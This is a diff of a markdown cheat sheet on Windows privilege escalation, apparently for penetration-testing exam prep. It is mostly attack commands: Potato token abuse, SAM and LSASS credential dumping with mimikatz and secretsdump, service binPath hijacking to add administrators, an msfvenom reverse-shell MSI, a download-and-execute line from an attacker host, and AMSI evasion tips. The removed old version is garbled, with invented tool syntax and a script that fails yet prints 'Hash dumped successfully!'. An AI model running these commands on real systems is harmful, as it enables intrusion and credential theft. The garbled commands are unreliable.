@@ -1,159 +1,146 @@
-# Windows Privilege Escalation (CPTS Level 2-3)
+# Windows Privilege Escalation
 
-Stop theorizing. Windows is the hardest OS to crack because of UAC, ASLR, DEP, and Account Control policies. If you can't get `SYSTEM` on Linux, you likely fail CPTS with Windows. Forget `sudo`. Learn `psexec`, `secretsdump`, and `pass-the-hash` chains. Use {target} for every scan.
+**Goal: `NT AUTHORITY\SYSTEM` on `{target}`.** Windows privesc is about tokens, services, and misconfigurations. Run winPEAS, then work the high-value checklist: token privileges, service misconfigs, AlwaysInstallElevated, unquoted paths, and stored creds.
 
-## Attack Workflow
+> Orient first: `whoami /all` (groups + **privileges** — this alone often decides the path), `systeminfo`, `whoami /priv`. If you see `SeImpersonatePrivilege` you're basically done (Potato).
 
-1.  **Enumerate Users/Groups**: Find standard accounts (Administrator, Guest, Backup Operators) and shadow accounts.
-2.  **Discover Active Hashes**: Connect to {target} via SMB and look for domain controllers or local SAM databases.
-3.  **Lateral Movement**: Use stolen credentials to jump hosts via WinRM, SMB, or SSH.
-4.  **Exploit Local Privilege**: Find misconfigurations, services, or vulnerabilities running with high privileges.
-5.  **Escalate to SYSTEM**: Bypass User Account Control (UAC) and install persistent backdoors.
-6.  **Persistence**: Ensure control of {target} survives reboots.
+---
 
-## Enumeration & Initial Access
+## Step 1 — Automated Enumeration
 
-### SMB Enumerations
-```bash
-# Check for domain join status on {target}
-nmap -sV -sC -p 139,445 {target}
-
-# Try to list shares and detect hidden ones
-nmap -sV {target} --script smb-enum-shares
-
-# Get user list (only if domain member)
-smbclient -L {target} -m SMB2 -N
-```
-
-### SMB Auth & Hash Grabbing
-```bash
-# Try standard admin password
-mimikatz.exe #use: sekurlsa::pth /user:Administrator /hash:<hash> /run:cmd.exe
-
-# Try local SAM dump
-smbget -t {target}/C$ /mnt/share /mnt/sam /mnt/password
-```
-
-### PowerShell Enumeration
 ```powershell
-# Check for UAC elevation status (if you have admin rights)
-Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" | Select-Object DisableLUA
+# winPEAS (upload winPEASx64.exe) — read the RED highlights
+.\winPEASx64.exe
 
-# List all running services and their privileges
-Get-Process | Format-Table Id, ProcessName, @{Name="User"; Expression={Get-Process $Id -Id $Id -UserPrincipalName}}
+# PowerUp (PowerShell) — finds and even abuses misconfigs
+powershell -ep bypass
+Import-Module .\PowerUp.ps1; Invoke-AllChecks
 
-# Check for pre-installed malware or backdoors
-Get-Process | Where-Object {$_.Path -match "C:\Windows\Temp\*.exe" or $_.Path -match "C:\Windows\SysWOW64\*.exe"}
+# Seatbelt for a deep host survey
+.\Seatbelt.exe -group=all
 ```
 
-### Service Exploitation
-```bash
-# Use Windows Service Exploiter (if available on {target})
-pwntools.exe service_exploit.py -s {target} -p <port>
+---
 
-# Use Metasploit for common vulnerabilities
-msfconsole -q -r windows-service-exploits.txt
-msfvenom -f windows/powershell -p windows/mimikatz /os:win7 /r:admin@{target}:445
+## Step 2 — Token Privileges (`whoami /priv`)
+
+The fastest wins on the exam. If **enabled**:
+
+| Privilege | Exploit |
+|-----------|---------|
+| `SeImpersonatePrivilege` | **Potato** attacks → SYSTEM (see below) |
+| `SeAssignPrimaryToken` | Potato attacks |
+| `SeBackupPrivilege` | Read any file → dump SAM/SYSTEM or `ntds.dit` |
+| `SeRestorePrivilege` | Write any file → hijack a service binary/DLL |
+| `SeDebugPrivilege` | Dump LSASS / inject into a SYSTEM process |
+| `SeTakeOwnership` | Take ownership of a protected file, then replace it |
+| `SeLoadDriver` | Load a vulnerable driver |
+
+**Potato (SeImpersonate) — extremely common on service accounts / IIS / MSSQL:**
+```powershell
+# GodPotato works on modern Windows 10/11/2019/2022
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\shell.exe"
+# Alternatives depending on OS: PrintSpoofer, JuicyPotatoNG
+.\PrintSpoofer64.exe -i -c powershell.exe
 ```
 
-## Escalation Chains & Payloads
+**SeBackupPrivilege → dump the hashes offline:**
+```cmd
+reg save HKLM\SAM  C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+:: exfil, then on Kali:
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
 
-### The Hash Grab Chain
-1.  **Connect to Domain Controller or Local Host**:
-    ```bash
-    # Identify the target hash
-    smbclient -L {target} -m SMB2 -U admin:<your_hash>
-    ```
-2.  **Dump Hashes Locally**:
-    ```bash
-    # Use Mimikatz
-    mimikatz.exe #use: sekurlsa::logoncommands
-    mimikatz.exe #use: sekurlsa::dump
+---
 
-    # Alternative: use Windows Authentication
-    msfvenom -p windows/mimikatz /os:win7 /r:admin@{target}:445
-    ```
-3.  **Pass the Hash to Remote Host**:
-    ```bash
-    # Use Mimikatz to pass hash to remote host
-    mimikatz.exe #use: sekurlsa::pth /user:Administrator /hash:<hash> /run:cmd.exe /system
+## Step 3 — Service Misconfigurations
 
-    # Use msfvenom to pass hash
-    msfvenom -p windows/mimikatz /os:win7 /r:admin@{target}:445
-    ```
-4.  **Execute Command**:
-    ```bash
-    # Run cmd.exe to get SYSTEM privileges
-    cmd.exe /c "net user <username> <password> /add"
-    ```
+```powershell
+# List non-default services + their binaries
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
+Get-CimInstance win32_service | select Name,PathName,StartMode | ft -auto
+```
 
-### The Pre-Auth Exploit Chain
-1.  **Find Unprotected Service**:
-    ```bash
-    # Use Nmap to find services with high privileges
-    nmap -sV -p 445,139 {target}
+### Unquoted service path
+```cmd
+:: If a service path has spaces and no quotes (e.g. C:\Program Files\My Service\svc.exe)
+:: and you can write to an earlier folder, Windows runs C:\Program.exe first.
+wmic service get name,pathname,startmode | findstr /i /v """
+:: Drop your payload as C:\Program Files\My.exe  (or the first writable segment)
+```
 
-    # Use FFUF to find backdoors or hidden services
-    ffuf -u http://fuf://{target}/ -w /usr/share/wordlists/dirb/common.txt
-    ```
-2.  **Exploit Vulnerability**:
-    ```bash
-    # Use Metasploit for known vulnerabilities
-    msfvenom -p windows/mimikatz /os:win7 /r:admin@{target}:445
+### Weak service binary/permissions (can overwrite the .exe or reconfigure it)
+```powershell
+# Check with accesschk (or PowerUp's Invoke-ServiceAbuse)
+accesschk.exe /accepteula -uwcqv "Everyone" *
+# If you can change the binPath and restart it:
+sc config VulnSvc binPath= "C:\Windows\Temp\shell.exe"
+sc stop VulnSvc & sc start VulnSvc
+# Or add yourself to local admins via a service that runs as SYSTEM:
+sc config VulnSvc binPath= "cmd /c net localgroup administrators user /add"
+```
 
-    # Use PowerShell to execute arbitrary code
-    powershell -c "Invoke-Expression (New-Object Net.HttpWebRequest('http://<attacker_ip>/payload').GetResponse().ReadToEnd())"
-    ```
-3.  **Bypass UAC**:
-    ```bash
-    # Use PowerShell to bypass UAC
-    powershell -c "Start-Process cmd.exe -ArgumentList /c \"net user <username> <password> /add\""
-    ```
-4.  **Install Persistence**:
-    ```bash
-    # Create a service to maintain access
-    sc create myMalware binpath="cmd.exe /c C:\Windows\System32\malware.exe" type= demand start
-    ```
+### DLL hijacking / writable service directory
+Drop a malicious DLL the service loads from a writable path, then restart the service.
 
-## Tips & Shortcuts
+---
 
-- **Avoid UAC**: Never run PowerShell or cmd.exe as SYSTEM unless you are sure. Use `psexec` instead.
-- **Use Hashes**: Don't try to guess passwords. Use `sekurlsa::pth` to pass hashes directly.
-- **Check Permissions**: Always check group memberships (Backup Operators, Administrators) before escalating.
-- **Lateral Movement**: Use `psexec` to move between hosts on {target}.
-- **Persistence**: Use services or registry keys to maintain access even after reboots.
+## Step 4 — Quick Wins Checklist
+
+```cmd
+:: AlwaysInstallElevated (both keys = 1 -> install a malicious MSI as SYSTEM)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+:: build:  msfvenom -p windows/x64/shell_reverse_tcp LHOST={target} LPORT=4444 -f msi -o evil.msi
+:: run:    msiexec /quiet /qn /i C:\Temp\evil.msi
+
+:: Stored credentials
+cmdkey /list
+reg query HKLM /f password /t REG_SZ /s
+reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
+dir /s /b *.config *unattend*.xml *.kdbx 2>nul
+findstr /si password *.xml *.ini *.txt *.config 2>nul
+type C:\Windows\Panther\Unattend.xml 2>nul
+
+:: Scheduled tasks with weak permissions
+schtasks /query /fo LIST /v | findstr /i "TaskName Run As"
+
+:: Saved WiFi / autologon
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+```
+
+---
+
+## Step 5 — Kernel / Missing Patches (last resort)
+```cmd
+systeminfo
+:: Feed into Windows-Exploit-Suggester or:
+wmic qfe get HotFixID
+```
+Look for classics: **PrintNightmare**, **HiveNightmare/SeriousSAM** (readable SAM), **CVE-2021-36934**.
+
+---
+
+## Step 6 — Dump Credentials once elevated
+
+```cmd
+:: Mimikatz (as admin/SYSTEM)
+mimikatz.exe
+  privilege::debug
+  sekurlsa::logonpasswords
+  lsadump::sam
+  sekurlsa::ekeys
+:: Or from Kali against the box with local admin creds:
+impacket-secretsdump ./Administrator:'Pass'@{target}
+nxc smb {target} -u Administrator -p 'Pass' --sam --lsa
+```
 
 ## Common Mistakes
 
-- **Ignoring Group Memberships**: Failing to check group permissions can lead to failed escalations.
-- **Running as User**: Running commands as a regular user instead of SYSTEM will fail many checks.
-- **Not Using Hashes**: Guessing passwords is slow and prone to failure.
-- **Skipping Enumeration**: Jumping straight to exploits without knowing the system configuration leads to wasted time.
-
-## Mini Automation Scripts
-
-### Python Script for Hash Dumping
-```python
-#!/usr/bin/env python3
-import subprocess
-import sys
-
-# Replace with actual target IP/URL
-target = "{target}"
-hashes = []
-
-# Get hash from known account
-cmd = f"mimikatz.exe #use: sekurlsa::pth /user:Administrator /hash:{hashes[0]} /run:cmd.exe /system"
-subprocess.run(cmd, shell=True)
-print("Hash dumped successfully!")
-```
-
-### Bash Script for SMB Enumeration
-```bash
-#!/bin/bash
-# smb_enum.sh
-target="{target}"
-
-nmap -sV -sC -p 139,445 $target
-smbclient -L $target -m SMB2 -N
-```
+- **Not reading `whoami /priv`.** `SeImpersonate`/`SeBackup`/`SeDebug` are the whole game — Potato and hash-dump paths.
+- **Ignoring service permissions.** `accesschk` + PowerUp find writable/ reconfigurable services fast.
+- **Overlooking stored creds** in `cmdkey`, unattend.xml, registry autologon, and `.config` files.
+- **Forgetting `-ep bypass`** for PowerShell scripts, or that AMSI may block them (use obfuscation / `-enc`).
+- **Wrong Potato for the OS.** Modern boxes → GodPotato / PrintSpoofer; JuicyPotato is for older builds only.
